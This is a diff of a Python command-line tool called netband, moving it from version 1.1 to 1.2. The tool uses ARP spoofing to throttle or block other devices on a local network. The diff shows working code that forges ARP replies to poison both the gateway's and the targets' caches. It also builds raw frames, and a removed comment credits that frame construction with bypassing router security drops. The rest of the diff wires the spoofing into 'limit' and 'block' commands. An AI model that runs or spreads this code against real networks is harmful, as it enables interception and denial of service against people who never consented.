@@ -10,18 +10,20 @@ from pathlib import Path
 
 IS_ANDROID = os.path.exists("/system/build.prop") or "ANDROID_ROOT" in os.environ
 
+_stderr = sys.stderr
+sys.stderr = open(os.devnull, 'w')
 try:
-    import logging
-    # Suppress that annoying red Scapy android warning
-    logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
     from scapy.all import ARP, Ether, sendp, sr1
     import warnings; warnings.filterwarnings("ignore")
     SCAPY_OK = not IS_ANDROID
 except ImportError:
     SCAPY_OK = False
+finally:
+    sys.stderr.close()
+    sys.stderr = _stderr
 
 BROADCAST = "ff:ff:ff:ff:ff:ff"
-VERSION = "1.1"
+VERSION = "1.2"
 TOOL_NAME = "netband"
 
 # ── config ───────────────────────────────────────────────────────────
@@ -75,16 +77,10 @@ def shq(cmd):
 # ── raw ARP (Android-safe) ───────────────────────────────────────────
 
 def _arp_packet(eth_src, arp_src, arp_src_ip, eth_dst, arp_dst, arp_dst_ip, op=2):
-    """
-    Build raw Ethernet+ARP frame.
-    Separating eth_src and arp_src bypasses WiFi Router security drops!
-    """
     def mac2b(m): return bytes(int(x, 16) for x in m.split(":"))
     def ip2b(i): return _socket.inet_aton(i)
     
-    # Ethernet Header
     eth = mac2b(eth_dst) + mac2b(eth_src) + b'\x08\x06'
-    # ARP Header
     arp = struct.pack("!HHBBH", 0x0001, 0x0800, 6, 4, op)
     arp += mac2b(arp_src) + ip2b(arp_src_ip) + mac2b(arp_dst) + ip2b(arp_dst_ip)
     
@@ -286,9 +282,7 @@ class Spoofer:
             sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, pdst=self.gw_ip, hwdst=self.gw_mac, hwsrc=self.local_mac), verbose=0, iface=self.iface)
             sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, pdst=ip, hwdst=mac, hwsrc=self.local_mac), verbose=0, iface=self.iface)
         else:
-            # Tell Target: GW is at MY_MAC
             _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.local_mac, self.gw_ip, mac, mac, ip, op=2))
-            # Tell GW: Target is at MY_MAC
             _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.local_mac, ip, self.gw_mac, self.gw_mac, self.gw_ip, op=2))
 
     def add(self, ip, mac):
@@ -306,32 +300,24 @@ class Spoofer:
 
     def _stop(self):
         self._running = False
-        
-        # Delay dimatikan setelah 2 detik agar routing jalan sejenak selama HP update cache
         def delayed_stop():
             time.sleep(2) 
             with self._lock:
                 if not self._targets:
                     shq(f"{SYSCTL} -w {IP_FWD}={self._fwd_orig or '0'}")
                     shq("conntrack -F 2>/dev/null")
-                    
         threading.Thread(target=delayed_stop, daemon=True).start()
 
     def _restore(self, ip, mac):
-        # Kirim beberapa kali untuk memastikan paket sampai
         for _ in range(4):
             if SCAPY_OK:
                 sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, hwsrc=mac, pdst=self.gw_ip, hwdst=BROADCAST), verbose=0, iface=self.iface)
                 sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, hwsrc=self.gw_mac, pdst=ip, hwdst=BROADCAST), verbose=0, iface=self.iface)
             else:
-                # 1. Unicast Ethernet -> Broadcast ARP Payload (Paling masuk akal & tembus AP Filter)
                 _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.gw_mac, self.gw_ip, mac, BROADCAST, ip, op=2))
                 _send_raw_arp(self.iface, _arp_packet(self.local_mac, mac, ip, self.gw_mac, BROADCAST, self.gw_ip, op=2))
-                
-                # 2. Broadcast murni jaga-jaga
                 _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.gw_mac, self.gw_ip, BROADCAST, BROADCAST, ip, op=2))
                 _send_raw_arp(self.iface, _arp_packet(self.local_mac, mac, ip, BROADCAST, BROADCAST, self.gw_ip, op=2))
-            
             time.sleep(0.1)
 
     def restore_all(self):
@@ -679,35 +665,67 @@ def print_help():
 # ── table printer ────────────────────────────────────────────────────
 
 def _print_host_table(devices, gw_ip, limiter):
-    hdr = f"{'ID':<4} {'IP':<16} {'MAC':<18} {'HOSTNAME':<24} {'STATUS':<14}"
-    print(f"{C.CYN}{hdr}{C.RST}")
-    print(C.DIM + "-" * len(hdr.replace(C.CYN,"").replace(C.RST,"")) + C.RST)
+    # Setup fixed column widths
+    w_id, w_ip, w_mac, w_host, w_stat = 4, 15, 17, 20, 8
+    
+    # Top border
+    print(f"{C.DIM}┌{'─'*(w_id+2)}┬{'─'*(w_ip+2)}┬{'─'*(w_mac+2)}┬{'─'*(w_host+2)}┬{'─'*(w_stat+2)}┐{C.RST}")
+    
+    # Headers
+    h_id = "ID".ljust(w_id)
+    h_ip = "IP address".ljust(w_ip)
+    h_mac = "MAC address".ljust(w_mac)
+    h_host = "Hostname".ljust(w_host)
+    h_stat = "Status".ljust(w_stat)
+    
+    print(f"{C.DIM}│{C.RST} {C.BLD}{h_id}{C.RST} {C.DIM}│{C.RST} {C.BLD}{h_ip}{C.RST} {C.DIM}│{C.RST} {C.BLD}{h_mac}{C.RST} {C.DIM}│{C.RST} {C.BLD}{h_host}{C.RST} {C.DIM}│{C.RST} {C.BLD}{h_stat}{C.RST} {C.DIM}│{C.RST}")
+    
+    # Separator
+    print(f"{C.DIM}├{'─'*(w_id+2)}┼{'─'*(w_ip+2)}┼{'─'*(w_mac+2)}┼{'─'*(w_host+2)}┼{'─'*(w_stat+2)}┤{C.RST}")
+    
+    # Rows
     for mac, d in sorted(devices.items(), key=lambda x: x[1]["id"]):
         is_gw = d["ip"] == gw_ip
         is_online = d.get("online", True)
-        info = limiter.get_status(d["ip"])
+        info = limiter.get_status(d["ip"]) if hasattr(limiter, 'get_status') else None
+        
+        id_str = str(d['id']).ljust(w_id)
+        ip_str = d['ip'].ljust(w_ip)
+        mac_str = d['mac'].ljust(w_mac)
+        
+        # Clean Hostname logic
+        host_raw = d.get("hostname", "")
+        if is_gw and (not host_raw or host_raw == "gateway" or host_raw == gw_ip):
+            host_raw = "_gateway"
+        host_str = host_raw[:w_host].ljust(w_host)
+        
+        # Status format logic
         if is_gw:
-            status = f"{C.MAG}gateway{C.RST}"
-        elif not is_online:
-            if info:
-                if info["blocked"]:
-                    status = f"{C.DIM}offline {C.RED}(blocked){C.RST}"
-                else:
-                    status = f"{C.DIM}offline {C.YEL}({info['rate']}){C.RST}"
-            else:
-                status = f"{C.DIM}offline{C.RST}"
+            stat_raw, stat_color = "Free", C.GRN
         elif info:
             if info["blocked"]:
-                status = f"{C.RED}blocked {Dir.icon(info['dir'])}{C.RST}"
+                stat_raw, stat_color = "Blocked", C.RED
             else:
-                status = f"{C.YEL}{info['rate']} {Dir.icon(info['dir'])}{C.RST}"
+                stat_raw, stat_color = "Limited", C.YEL
+        elif not is_online:
+            stat_raw, stat_color = "Offline", C.DIM
         else:
-            status = f"{C.GRN}online{C.RST}"
-        ip = d["ip"].ljust(15)
-        if is_gw: ip = f"{C.MAG}{ip}{C.RST}"
-        mac_s = d["mac"].ljust(17)
-        hn = d["hostname"][:23].ljust(23)
-        print(f" {d['id']:<3} {ip}  {mac_s} {hn}  {status}")
+            stat_raw, stat_color = "Free", C.GRN
+            
+        stat_str = stat_raw.ljust(w_stat)
+
+        # Apply Colors
+        c_id = f"{C.YEL}{id_str}{C.RST}"
+        if host_raw == "_gateway":
+            c_host = f"{C.DIM}{host_str}{C.RST}"
+        else:
+            c_host = f"{host_str}"
+        c_stat = f"{stat_color}{stat_str}{C.RST}"
+        
+        print(f"{C.DIM}│{C.RST} {c_id} {C.DIM}│{C.RST} {ip_str} {C.DIM}│{C.RST} {mac_str} {C.DIM}│{C.RST} {c_host} {C.DIM}│{C.RST} {c_stat} {C.DIM}│{C.RST}")
+        
+    # Bottom border
+    print(f"{C.DIM}└{'─'*(w_id+2)}┴{'─'*(w_ip+2)}┴{'─'*(w_mac+2)}┴{'─'*(w_host+2)}┴{'─'*(w_stat+2)}┘{C.RST}")
 
 # ── main ─────────────────────────────────────────────────────────────
 
@@ -818,16 +836,18 @@ def main():
             devs = parse_ids(ids_s, devices)
             if not devs:
                 print(f"{C.RED}No matching hosts.{C.RST}"); continue
+            
+            success_ips = []
             for d in devs:
-                if d["ip"] == gw_ip:
-                    print(f"{C.YEL}Skipping Gateway. Use 'limit all' to limit the whole network.{C.RST}")
-                    continue
+                if d["ip"] == gw_ip: continue
                 spoofer.add(d["ip"], d["mac"])
                 limiter.limit(d["ip"], rate, direction)
                 d["limits"] = {"rate": rate, "direction": direction}
+                success_ips.append(d["ip"])
             save(DEVICES_FILE, devices)
-            ips = ", ".join(d["ip"] for d in devs if d["ip"] != gw_ip)
-            print(f"{C.GRN}Limited {ips} to {rate} ({Dir.name(direction)}){C.RST}")
+            if success_ips:
+                ips = ", ".join(success_ips)
+                print(f"{C.GRN}Limited {ips} to {rate} ({Dir.name(direction)}){C.RST}")
 
         elif cmd == "block":
             if not arg:
@@ -837,10 +857,9 @@ def main():
             devs = parse_ids(w[0], devices)
             if not devs:
                 print(f"{C.RED}No matching hosts.{C.RST}"); continue
+            
             for d in devs:
-                if d["ip"] == gw_ip:
-                    print(f"{C.YEL}Skipping Gateway. Use 'block all' to drop everyone's internet.{C.RST}")
-                    continue
+                if d["ip"] == gw_ip: continue
                 spoofer.add(d["ip"], d["mac"])
                 limiter.block(d["ip"], direction)
                 d["limits"] = {"rate": None, "direction": direction, "blocked": True}
@@ -853,6 +872,7 @@ def main():
             devs = parse_ids(arg.split()[0], devices)
             if not devs:
                 print(f"{C.RED}No matching hosts.{C.RST}"); continue
+            
             for d in devs:
                 if d["ip"] == gw_ip: continue
                 limiter.unlimit(d["ip"])
